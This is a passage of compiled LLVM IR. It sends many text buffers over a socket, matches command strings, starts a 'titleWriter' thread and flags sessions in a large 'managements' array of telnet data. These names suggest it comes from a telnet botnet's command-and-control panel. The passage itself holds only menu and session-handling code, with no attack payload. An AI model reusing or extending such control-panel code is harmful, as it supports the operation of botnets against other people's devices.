  %1287 = call i32 (i8*, i8*, ...) @sprintf(i8* %1286, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.111, i64 0, i64 0)) #9
  %1288 = load i32, i32* %5, align 4
  %1289 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i64 0, i64 0
  %1290 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i64 0, i64 0
  %1291 = call i64 @strlen(i8* %1290) #8
  %1292 = call i64 @send(i32 %1288, i8* %1289, i64 %1291, i32 16384)
  %1293 = icmp eq i64 %1292, -1
  br i1 %1293, label %1294, label %1295

1294:                                             ; preds = %1275
  br label %2321

1295:                                             ; preds = %1275
  %1296 = load i32, i32* %5, align 4
  %1297 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i64 0, i64 0
  %1298 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i64 0, i64 0
  %1299 = call i64 @strlen(i8* %1298) #8
  %1300 = call i64 @send(i32 %1296, i8* %1297, i64 %1299, i32 16384)
  %1301 = icmp eq i64 %1300, -1
  br i1 %1301, label %1302, label %1303

1302:                                             ; preds = %1295
  br label %2321

1303:                                             ; preds = %1295
  %1304 = load i32, i32* %5, align 4
  %1305 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i64 0, i64 0
  %1306 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i64 0, i64 0
  %1307 = call i64 @strlen(i8* %1306) #8
  %1308 = call i64 @send(i32 %1304, i8* %1305, i64 %1307, i32 16384)
  %1309 = icmp eq i64 %1308, -1
  br i1 %1309, label %1310, label %1311

1310:                                             ; preds = %1303
  br label %2321

1311:                                             ; preds = %1303
  %1312 = load i32, i32* %5, align 4
  %1313 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i64 0, i64 0
  %1314 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i64 0, i64 0
  %1315 = call i64 @strlen(i8* %1314) #8
  %1316 = call i64 @send(i32 %1312, i8* %1313, i64 %1315, i32 16384)
  %1317 = icmp eq i64 %1316, -1
  br i1 %1317, label %1318, label %1319

1318:                                             ; preds = %1311
  br label %2321

1319:                                             ; preds = %1311
  %1320 = load i32, i32* %5, align 4
  %1321 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i64 0, i64 0
  %1322 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i64 0, i64 0
  %1323 = call i64 @strlen(i8* %1322) #8
  %1324 = call i64 @send(i32 %1320, i8* %1321, i64 %1323, i32 16384)
  %1325 = icmp eq i64 %1324, -1
  br i1 %1325, label %1326, label %1327

1326:                                             ; preds = %1319
  br label %2321

1327:                                             ; preds = %1319
  %1328 = load i8*, i8** %3, align 8
  %1329 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1328) #9
  br label %1330

1330:                                             ; preds = %1327
  %1331 = load i32, i32* %5, align 4
  %1332 = call i64 @send(i32 %1331, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.55, i64 0, i64 0), i64 24, i32 16384)
  %1333 = icmp eq i64 %1332, -1
  br i1 %1333, label %1334, label %1335

1334:                                             ; preds = %1330
  br label %2321

1335:                                             ; preds = %1330
  br label %1336

1336:                                             ; preds = %1335
  br label %519, !llvm.loop !19

1337:                                             ; preds = %1271
  %1338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1339 = call i8* @strstr(i8* %1338, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.112, i64 0, i64 0)) #8
  %1340 = icmp ne i8* %1339, null
  br i1 %1340, label %1341, label %1551

1341:                                             ; preds = %1337
  %1342 = load i32, i32* %5, align 4
  %1343 = call i64 @send(i32 %1342, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i64 0, i64 0), i64 14, i32 16384)
  %1344 = icmp eq i64 %1343, -1
  br i1 %1344, label %1345, label %1346

1345:                                             ; preds = %1341
  br label %2321

1346:                                             ; preds = %1341
  %1347 = load i32, i32* %5, align 4
  %1348 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %1349 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %1350 = call i64 @strlen(i8* %1349) #8
  %1351 = call i64 @send(i32 %1347, i8* %1348, i64 %1350, i32 16384)
  %1352 = icmp eq i64 %1351, -1
  br i1 %1352, label %1353, label %1354

1353:                                             ; preds = %1346
  br label %2321

1354:                                             ; preds = %1346
  %1355 = load i32, i32* %5, align 4
  %1356 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %1357 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %1358 = call i64 @strlen(i8* %1357) #8
  %1359 = call i64 @send(i32 %1355, i8* %1356, i64 %1358, i32 16384)
  %1360 = icmp eq i64 %1359, -1
  br i1 %1360, label %1361, label %1362

1361:                                             ; preds = %1354
  br label %2321

1362:                                             ; preds = %1354
  %1363 = load i32, i32* %5, align 4
  %1364 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %1365 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %1366 = call i64 @strlen(i8* %1365) #8
  %1367 = call i64 @send(i32 %1363, i8* %1364, i64 %1366, i32 16384)
  %1368 = icmp eq i64 %1367, -1
  br i1 %1368, label %1369, label %1370

1369:                                             ; preds = %1362
  br label %2321

1370:                                             ; preds = %1362
  %1371 = load i32, i32* %5, align 4
  %1372 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %1373 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %1374 = call i64 @strlen(i8* %1373) #8
  %1375 = call i64 @send(i32 %1371, i8* %1372, i64 %1374, i32 16384)
  %1376 = icmp eq i64 %1375, -1
  br i1 %1376, label %1377, label %1378

1377:                                             ; preds = %1370
  br label %2321

1378:                                             ; preds = %1370
  %1379 = load i32, i32* %5, align 4
  %1380 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %1381 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %1382 = call i64 @strlen(i8* %1381) #8
  %1383 = call i64 @send(i32 %1379, i8* %1380, i64 %1382, i32 16384)
  %1384 = icmp eq i64 %1383, -1
  br i1 %1384, label %1385, label %1386

1385:                                             ; preds = %1378
  br label %2321

1386:                                             ; preds = %1378
  %1387 = load i32, i32* %5, align 4
  %1388 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %1389 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %1390 = call i64 @strlen(i8* %1389) #8
  %1391 = call i64 @send(i32 %1387, i8* %1388, i64 %1390, i32 16384)
  %1392 = icmp eq i64 %1391, -1
  br i1 %1392, label %1393, label %1394

1393:                                             ; preds = %1386
  br label %2321

1394:                                             ; preds = %1386
  %1395 = load i32, i32* %5, align 4
  %1396 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %1397 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %1398 = call i64 @strlen(i8* %1397) #8
  %1399 = call i64 @send(i32 %1395, i8* %1396, i64 %1398, i32 16384)
  %1400 = icmp eq i64 %1399, -1
  br i1 %1400, label %1401, label %1402

1401:                                             ; preds = %1394
  br label %2321

1402:                                             ; preds = %1394
  %1403 = load i32, i32* %5, align 4
  %1404 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %1405 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %1406 = call i64 @strlen(i8* %1405) #8
  %1407 = call i64 @send(i32 %1403, i8* %1404, i64 %1406, i32 16384)
  %1408 = icmp eq i64 %1407, -1
  br i1 %1408, label %1409, label %1410

1409:                                             ; preds = %1402
  br label %2321

1410:                                             ; preds = %1402
  %1411 = load i32, i32* %5, align 4
  %1412 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %1413 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %1414 = call i64 @strlen(i8* %1413) #8
  %1415 = call i64 @send(i32 %1411, i8* %1412, i64 %1414, i32 16384)
  %1416 = icmp eq i64 %1415, -1
  br i1 %1416, label %1417, label %1418

1417:                                             ; preds = %1410
  br label %2321

1418:                                             ; preds = %1410
  %1419 = load i32, i32* %5, align 4
  %1420 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %1421 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %1422 = call i64 @strlen(i8* %1421) #8
  %1423 = call i64 @send(i32 %1419, i8* %1420, i64 %1422, i32 16384)
  %1424 = icmp eq i64 %1423, -1
  br i1 %1424, label %1425, label %1426

1425:                                             ; preds = %1418
  br label %2321

1426:                                             ; preds = %1418
  %1427 = load i32, i32* %5, align 4
  %1428 = getelementptr inbounds [90000 x i8], [90000 x i8]* %28, i64 0, i64 0
  %1429 = getelementptr inbounds [90000 x i8], [90000 x i8]* %28, i64 0, i64 0
  %1430 = call i64 @strlen(i8* %1429) #8
  %1431 = call i64 @send(i32 %1427, i8* %1428, i64 %1430, i32 16384)
  %1432 = icmp eq i64 %1431, -1
  br i1 %1432, label %1433, label %1434

1433:                                             ; preds = %1426
  br label %2321

1434:                                             ; preds = %1426
  %1435 = load i32, i32* %5, align 4
  %1436 = getelementptr inbounds [90000 x i8], [90000 x i8]* %29, i64 0, i64 0
  %1437 = getelementptr inbounds [90000 x i8], [90000 x i8]* %29, i64 0, i64 0
  %1438 = call i64 @strlen(i8* %1437) #8
  %1439 = call i64 @send(i32 %1435, i8* %1436, i64 %1438, i32 16384)
  %1440 = icmp eq i64 %1439, -1
  br i1 %1440, label %1441, label %1442

1441:                                             ; preds = %1434
  br label %2321

1442:                                             ; preds = %1434
  %1443 = load i32, i32* %5, align 4
  %1444 = getelementptr inbounds [90000 x i8], [90000 x i8]* %30, i64 0, i64 0
  %1445 = getelementptr inbounds [90000 x i8], [90000 x i8]* %30, i64 0, i64 0
  %1446 = call i64 @strlen(i8* %1445) #8
  %1447 = call i64 @send(i32 %1443, i8* %1444, i64 %1446, i32 16384)
  %1448 = icmp eq i64 %1447, -1
  br i1 %1448, label %1449, label %1450

1449:                                             ; preds = %1442
  br label %2321

1450:                                             ; preds = %1442
  %1451 = load i32, i32* %5, align 4
  %1452 = getelementptr inbounds [90000 x i8], [90000 x i8]* %31, i64 0, i64 0
  %1453 = getelementptr inbounds [90000 x i8], [90000 x i8]* %31, i64 0, i64 0
  %1454 = call i64 @strlen(i8* %1453) #8
  %1455 = call i64 @send(i32 %1451, i8* %1452, i64 %1454, i32 16384)
  %1456 = icmp eq i64 %1455, -1
  br i1 %1456, label %1457, label %1458

1457:                                             ; preds = %1450
  br label %2321

1458:                                             ; preds = %1450
  %1459 = load i32, i32* %5, align 4
  %1460 = getelementptr inbounds [90000 x i8], [90000 x i8]* %32, i64 0, i64 0
  %1461 = getelementptr inbounds [90000 x i8], [90000 x i8]* %32, i64 0, i64 0
  %1462 = call i64 @strlen(i8* %1461) #8
  %1463 = call i64 @send(i32 %1459, i8* %1460, i64 %1462, i32 16384)
  %1464 = icmp eq i64 %1463, -1
  br i1 %1464, label %1465, label %1466

1465:                                             ; preds = %1458
  br label %2321

1466:                                             ; preds = %1458
  %1467 = load i32, i32* %5, align 4
  %1468 = getelementptr inbounds [90000 x i8], [90000 x i8]* %33, i64 0, i64 0
  %1469 = getelementptr inbounds [90000 x i8], [90000 x i8]* %33, i64 0, i64 0
  %1470 = call i64 @strlen(i8* %1469) #8
  %1471 = call i64 @send(i32 %1467, i8* %1468, i64 %1470, i32 16384)
  %1472 = icmp eq i64 %1471, -1
  br i1 %1472, label %1473, label %1474

1473:                                             ; preds = %1466
  br label %2321

1474:                                             ; preds = %1466
  %1475 = load i32, i32* %5, align 4
  %1476 = getelementptr inbounds [90000 x i8], [90000 x i8]* %34, i64 0, i64 0
  %1477 = getelementptr inbounds [90000 x i8], [90000 x i8]* %34, i64 0, i64 0
  %1478 = call i64 @strlen(i8* %1477) #8
  %1479 = call i64 @send(i32 %1475, i8* %1476, i64 %1478, i32 16384)
  %1480 = icmp eq i64 %1479, -1
  br i1 %1480, label %1481, label %1482

1481:                                             ; preds = %1474
  br label %2321

1482:                                             ; preds = %1474
  %1483 = load i32, i32* %5, align 4
  %1484 = getelementptr inbounds [90000 x i8], [90000 x i8]* %35, i64 0, i64 0
  %1485 = getelementptr inbounds [90000 x i8], [90000 x i8]* %35, i64 0, i64 0
  %1486 = call i64 @strlen(i8* %1485) #8
  %1487 = call i64 @send(i32 %1483, i8* %1484, i64 %1486, i32 16384)
  %1488 = icmp eq i64 %1487, -1
  br i1 %1488, label %1489, label %1490

1489:                                             ; preds = %1482
  br label %2321

1490:                                             ; preds = %1482
  %1491 = load i32, i32* %5, align 4
  %1492 = getelementptr inbounds [90000 x i8], [90000 x i8]* %36, i64 0, i64 0
  %1493 = getelementptr inbounds [90000 x i8], [90000 x i8]* %36, i64 0, i64 0
  %1494 = call i64 @strlen(i8* %1493) #8
  %1495 = call i64 @send(i32 %1491, i8* %1492, i64 %1494, i32 16384)
  %1496 = icmp eq i64 %1495, -1
  br i1 %1496, label %1497, label %1498

1497:                                             ; preds = %1490
  br label %2321

1498:                                             ; preds = %1490
  %1499 = load i32, i32* %5, align 4
  %1500 = getelementptr inbounds [90000 x i8], [90000 x i8]* %37, i64 0, i64 0
  %1501 = getelementptr inbounds [90000 x i8], [90000 x i8]* %37, i64 0, i64 0
  %1502 = call i64 @strlen(i8* %1501) #8
  %1503 = call i64 @send(i32 %1499, i8* %1500, i64 %1502, i32 16384)
  %1504 = icmp eq i64 %1503, -1
  br i1 %1504, label %1505, label %1506

1505:                                             ; preds = %1498
  br label %2321

1506:                                             ; preds = %1498
  %1507 = load i32, i32* %5, align 4
  %1508 = getelementptr inbounds [90000 x i8], [90000 x i8]* %38, i64 0, i64 0
  %1509 = getelementptr inbounds [90000 x i8], [90000 x i8]* %38, i64 0, i64 0
  %1510 = call i64 @strlen(i8* %1509) #8
  %1511 = call i64 @send(i32 %1507, i8* %1508, i64 %1510, i32 16384)
  %1512 = icmp eq i64 %1511, -1
  br i1 %1512, label %1513, label %1514

1513:                                             ; preds = %1506
  br label %2321

1514:                                             ; preds = %1506
  %1515 = load i32, i32* %5, align 4
  %1516 = getelementptr inbounds [90000 x i8], [90000 x i8]* %39, i64 0, i64 0
  %1517 = getelementptr inbounds [90000 x i8], [90000 x i8]* %39, i64 0, i64 0
  %1518 = call i64 @strlen(i8* %1517) #8
  %1519 = call i64 @send(i32 %1515, i8* %1516, i64 %1518, i32 16384)
  %1520 = icmp eq i64 %1519, -1
  br i1 %1520, label %1521, label %1522

1521:                                             ; preds = %1514
  br label %2321

1522:                                             ; preds = %1514
  %1523 = load i32, i32* %5, align 4
  %1524 = getelementptr inbounds [90000 x i8], [90000 x i8]* %40, i64 0, i64 0
  %1525 = getelementptr inbounds [90000 x i8], [90000 x i8]* %40, i64 0, i64 0
  %1526 = call i64 @strlen(i8* %1525) #8
  %1527 = call i64 @send(i32 %1523, i8* %1524, i64 %1526, i32 16384)
  %1528 = icmp eq i64 %1527, -1
  br i1 %1528, label %1529, label %1530

1529:                                             ; preds = %1522
  br label %2321

1530:                                             ; preds = %1522
  %1531 = load i32, i32* %5, align 4
  %1532 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %1533 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %1534 = call i64 @strlen(i8* %1533) #8
  %1535 = call i64 @send(i32 %1531, i8* %1532, i64 %1534, i32 16384)
  %1536 = icmp eq i64 %1535, -1
  br i1 %1536, label %1537, label %1538

1537:                                             ; preds = %1530
  br label %2321

1538:                                             ; preds = %1530
  %1539 = load i32, i32* %5, align 4
  %1540 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %1541 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %1542 = call i64 @strlen(i8* %1541) #8
  %1543 = call i64 @send(i32 %1539, i8* %1540, i64 %1542, i32 16384)
  %1544 = icmp eq i64 %1543, -1
  br i1 %1544, label %1545, label %1546

1545:                                             ; preds = %1538
  br label %2321

1546:                                             ; preds = %1538
  %1547 = load i32, i32* %5, align 4
  %1548 = sext i32 %1547 to i64
  %1549 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1548
  %1550 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1549, i32 0, i32 0
  store i32 1, i32* %1550, align 4
  br label %1551

1551:                                             ; preds = %1546, %1337
  %1552 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1553 = call i8* @strstr(i8* %1552, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.113, i64 0, i64 0)) #8
  %1554 = icmp ne i8* %1553, null
  br i1 %1554, label %1555, label %1765

1555:                                             ; preds = %1551
  %1556 = load i32, i32* %5, align 4
  %1557 = call i64 @send(i32 %1556, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i64 0, i64 0), i64 14, i32 16384)
  %1558 = icmp eq i64 %1557, -1
  br i1 %1558, label %1559, label %1560

1559:                                             ; preds = %1555
  br label %2321

1560:                                             ; preds = %1555
  %1561 = load i32, i32* %5, align 4
  %1562 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %1563 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %1564 = call i64 @strlen(i8* %1563) #8
  %1565 = call i64 @send(i32 %1561, i8* %1562, i64 %1564, i32 16384)
  %1566 = icmp eq i64 %1565, -1
  br i1 %1566, label %1567, label %1568

1567:                                             ; preds = %1560
  br label %2321

1568:                                             ; preds = %1560
  %1569 = load i32, i32* %5, align 4
  %1570 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %1571 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %1572 = call i64 @strlen(i8* %1571) #8
  %1573 = call i64 @send(i32 %1569, i8* %1570, i64 %1572, i32 16384)
  %1574 = icmp eq i64 %1573, -1
  br i1 %1574, label %1575, label %1576

1575:                                             ; preds = %1568
  br label %2321

1576:                                             ; preds = %1568
  %1577 = load i32, i32* %5, align 4
  %1578 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %1579 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %1580 = call i64 @strlen(i8* %1579) #8
  %1581 = call i64 @send(i32 %1577, i8* %1578, i64 %1580, i32 16384)
  %1582 = icmp eq i64 %1581, -1
  br i1 %1582, label %1583, label %1584

1583:                                             ; preds = %1576
  br label %2321

1584:                                             ; preds = %1576
  %1585 = load i32, i32* %5, align 4
  %1586 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %1587 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %1588 = call i64 @strlen(i8* %1587) #8
  %1589 = call i64 @send(i32 %1585, i8* %1586, i64 %1588, i32 16384)
  %1590 = icmp eq i64 %1589, -1
  br i1 %1590, label %1591, label %1592

1591:                                             ; preds = %1584
  br label %2321

1592:                                             ; preds = %1584
  %1593 = load i32, i32* %5, align 4
  %1594 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %1595 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %1596 = call i64 @strlen(i8* %1595) #8
  %1597 = call i64 @send(i32 %1593, i8* %1594, i64 %1596, i32 16384)
  %1598 = icmp eq i64 %1597, -1
  br i1 %1598, label %1599, label %1600

1599:                                             ; preds = %1592
  br label %2321

1600:                                             ; preds = %1592
  %1601 = load i32, i32* %5, align 4
  %1602 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %1603 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %1604 = call i64 @strlen(i8* %1603) #8
  %1605 = call i64 @send(i32 %1601, i8* %1602, i64 %1604, i32 16384)
  %1606 = icmp eq i64 %1605, -1
  br i1 %1606, label %1607, label %1608

1607:                                             ; preds = %1600
  br label %2321

1608:                                             ; preds = %1600
  %1609 = load i32, i32* %5, align 4
  %1610 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %1611 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %1612 = call i64 @strlen(i8* %1611) #8
  %1613 = call i64 @send(i32 %1609, i8* %1610, i64 %1612, i32 16384)
  %1614 = icmp eq i64 %1613, -1
  br i1 %1614, label %1615, label %1616

1615:                                             ; preds = %1608
  br label %2321

1616:                                             ; preds = %1608
  %1617 = load i32, i32* %5, align 4
  %1618 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %1619 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %1620 = call i64 @strlen(i8* %1619) #8
  %1621 = call i64 @send(i32 %1617, i8* %1618, i64 %1620, i32 16384)
  %1622 = icmp eq i64 %1621, -1
  br i1 %1622, label %1623, label %1624

1623:                                             ; preds = %1616
  br label %2321

1624:                                             ; preds = %1616
  %1625 = load i32, i32* %5, align 4
  %1626 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %1627 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %1628 = call i64 @strlen(i8* %1627) #8
  %1629 = call i64 @send(i32 %1625, i8* %1626, i64 %1628, i32 16384)
  %1630 = icmp eq i64 %1629, -1
  br i1 %1630, label %1631, label %1632

1631:                                             ; preds = %1624
  br label %2321

1632:                                             ; preds = %1624
  %1633 = load i32, i32* %5, align 4
  %1634 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %1635 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %1636 = call i64 @strlen(i8* %1635) #8
  %1637 = call i64 @send(i32 %1633, i8* %1634, i64 %1636, i32 16384)
  %1638 = icmp eq i64 %1637, -1
  br i1 %1638, label %1639, label %1640

1639:                                             ; preds = %1632
  br label %2321

1640:                                             ; preds = %1632
  %1641 = load i32, i32* %5, align 4
  %1642 = getelementptr inbounds [90000 x i8], [90000 x i8]* %28, i64 0, i64 0
  %1643 = getelementptr inbounds [90000 x i8], [90000 x i8]* %28, i64 0, i64 0
  %1644 = call i64 @strlen(i8* %1643) #8
  %1645 = call i64 @send(i32 %1641, i8* %1642, i64 %1644, i32 16384)
  %1646 = icmp eq i64 %1645, -1
  br i1 %1646, label %1647, label %1648

1647:                                             ; preds = %1640
  br label %2321

1648:                                             ; preds = %1640
  %1649 = load i32, i32* %5, align 4
  %1650 = getelementptr inbounds [90000 x i8], [90000 x i8]* %29, i64 0, i64 0
  %1651 = getelementptr inbounds [90000 x i8], [90000 x i8]* %29, i64 0, i64 0
  %1652 = call i64 @strlen(i8* %1651) #8
  %1653 = call i64 @send(i32 %1649, i8* %1650, i64 %1652, i32 16384)
  %1654 = icmp eq i64 %1653, -1
  br i1 %1654, label %1655, label %1656

1655:                                             ; preds = %1648
  br label %2321

1656:                                             ; preds = %1648
  %1657 = load i32, i32* %5, align 4
  %1658 = getelementptr inbounds [90000 x i8], [90000 x i8]* %30, i64 0, i64 0
  %1659 = getelementptr inbounds [90000 x i8], [90000 x i8]* %30, i64 0, i64 0
  %1660 = call i64 @strlen(i8* %1659) #8
  %1661 = call i64 @send(i32 %1657, i8* %1658, i64 %1660, i32 16384)
  %1662 = icmp eq i64 %1661, -1
  br i1 %1662, label %1663, label %1664

1663:                                             ; preds = %1656
  br label %2321

1664:                                             ; preds = %1656
  %1665 = load i32, i32* %5, align 4
  %1666 = getelementptr inbounds [90000 x i8], [90000 x i8]* %31, i64 0, i64 0
  %1667 = getelementptr inbounds [90000 x i8], [90000 x i8]* %31, i64 0, i64 0
  %1668 = call i64 @strlen(i8* %1667) #8
  %1669 = call i64 @send(i32 %1665, i8* %1666, i64 %1668, i32 16384)
  %1670 = icmp eq i64 %1669, -1
  br i1 %1670, label %1671, label %1672

1671:                                             ; preds = %1664
  br label %2321

1672:                                             ; preds = %1664
  %1673 = load i32, i32* %5, align 4
  %1674 = getelementptr inbounds [90000 x i8], [90000 x i8]* %32, i64 0, i64 0
  %1675 = getelementptr inbounds [90000 x i8], [90000 x i8]* %32, i64 0, i64 0
  %1676 = call i64 @strlen(i8* %1675) #8
  %1677 = call i64 @send(i32 %1673, i8* %1674, i64 %1676, i32 16384)
  %1678 = icmp eq i64 %1677, -1
  br i1 %1678, label %1679, label %1680

1679:                                             ; preds = %1672
  br label %2321

1680:                                             ; preds = %1672
  %1681 = load i32, i32* %5, align 4
  %1682 = getelementptr inbounds [90000 x i8], [90000 x i8]* %33, i64 0, i64 0
  %1683 = getelementptr inbounds [90000 x i8], [90000 x i8]* %33, i64 0, i64 0
  %1684 = call i64 @strlen(i8* %1683) #8
  %1685 = call i64 @send(i32 %1681, i8* %1682, i64 %1684, i32 16384)
  %1686 = icmp eq i64 %1685, -1
  br i1 %1686, label %1687, label %1688

1687:                                             ; preds = %1680
  br label %2321

1688:                                             ; preds = %1680
  %1689 = load i32, i32* %5, align 4
  %1690 = getelementptr inbounds [90000 x i8], [90000 x i8]* %34, i64 0, i64 0
  %1691 = getelementptr inbounds [90000 x i8], [90000 x i8]* %34, i64 0, i64 0
  %1692 = call i64 @strlen(i8* %1691) #8
  %1693 = call i64 @send(i32 %1689, i8* %1690, i64 %1692, i32 16384)
  %1694 = icmp eq i64 %1693, -1
  br i1 %1694, label %1695, label %1696

1695:                                             ; preds = %1688
  br label %2321

1696:                                             ; preds = %1688
  %1697 = load i32, i32* %5, align 4
  %1698 = getelementptr inbounds [90000 x i8], [90000 x i8]* %35, i64 0, i64 0
  %1699 = getelementptr inbounds [90000 x i8], [90000 x i8]* %35, i64 0, i64 0
  %1700 = call i64 @strlen(i8* %1699) #8
  %1701 = call i64 @send(i32 %1697, i8* %1698, i64 %1700, i32 16384)
  %1702 = icmp eq i64 %1701, -1
  br i1 %1702, label %1703, label %1704

1703:                                             ; preds = %1696
  br label %2321

1704:                                             ; preds = %1696
  %1705 = load i32, i32* %5, align 4
  %1706 = getelementptr inbounds [90000 x i8], [90000 x i8]* %36, i64 0, i64 0
  %1707 = getelementptr inbounds [90000 x i8], [90000 x i8]* %36, i64 0, i64 0
  %1708 = call i64 @strlen(i8* %1707) #8
  %1709 = call i64 @send(i32 %1705, i8* %1706, i64 %1708, i32 16384)
  %1710 = icmp eq i64 %1709, -1
  br i1 %1710, label %1711, label %1712

1711:                                             ; preds = %1704
  br label %2321

1712:                                             ; preds = %1704
  %1713 = load i32, i32* %5, align 4
  %1714 = getelementptr inbounds [90000 x i8], [90000 x i8]* %37, i64 0, i64 0
  %1715 = getelementptr inbounds [90000 x i8], [90000 x i8]* %37, i64 0, i64 0
  %1716 = call i64 @strlen(i8* %1715) #8
  %1717 = call i64 @send(i32 %1713, i8* %1714, i64 %1716, i32 16384)
  %1718 = icmp eq i64 %1717, -1
  br i1 %1718, label %1719, label %1720

1719:                                             ; preds = %1712
  br label %2321

1720:                                             ; preds = %1712
  %1721 = load i32, i32* %5, align 4
  %1722 = getelementptr inbounds [90000 x i8], [90000 x i8]* %38, i64 0, i64 0
  %1723 = getelementptr inbounds [90000 x i8], [90000 x i8]* %38, i64 0, i64 0
  %1724 = call i64 @strlen(i8* %1723) #8
  %1725 = call i64 @send(i32 %1721, i8* %1722, i64 %1724, i32 16384)
  %1726 = icmp eq i64 %1725, -1
  br i1 %1726, label %1727, label %1728

1727:                                             ; preds = %1720
  br label %2321

1728:                                             ; preds = %1720
  %1729 = load i32, i32* %5, align 4
  %1730 = getelementptr inbounds [90000 x i8], [90000 x i8]* %39, i64 0, i64 0
  %1731 = getelementptr inbounds [90000 x i8], [90000 x i8]* %39, i64 0, i64 0
  %1732 = call i64 @strlen(i8* %1731) #8
  %1733 = call i64 @send(i32 %1729, i8* %1730, i64 %1732, i32 16384)
  %1734 = icmp eq i64 %1733, -1
  br i1 %1734, label %1735, label %1736

1735:                                             ; preds = %1728
  br label %2321

1736:                                             ; preds = %1728
  %1737 = load i32, i32* %5, align 4
  %1738 = getelementptr inbounds [90000 x i8], [90000 x i8]* %40, i64 0, i64 0
  %1739 = getelementptr inbounds [90000 x i8], [90000 x i8]* %40, i64 0, i64 0
  %1740 = call i64 @strlen(i8* %1739) #8
  %1741 = call i64 @send(i32 %1737, i8* %1738, i64 %1740, i32 16384)
  %1742 = icmp eq i64 %1741, -1
  br i1 %1742, label %1743, label %1744

1743:                                             ; preds = %1736
  br label %2321

1744:                                             ; preds = %1736
  %1745 = load i32, i32* %5, align 4
  %1746 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %1747 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %1748 = call i64 @strlen(i8* %1747) #8
  %1749 = call i64 @send(i32 %1745, i8* %1746, i64 %1748, i32 16384)
  %1750 = icmp eq i64 %1749, -1
  br i1 %1750, label %1751, label %1752

1751:                                             ; preds = %1744
  br label %2321

1752:                                             ; preds = %1744
  %1753 = load i32, i32* %5, align 4
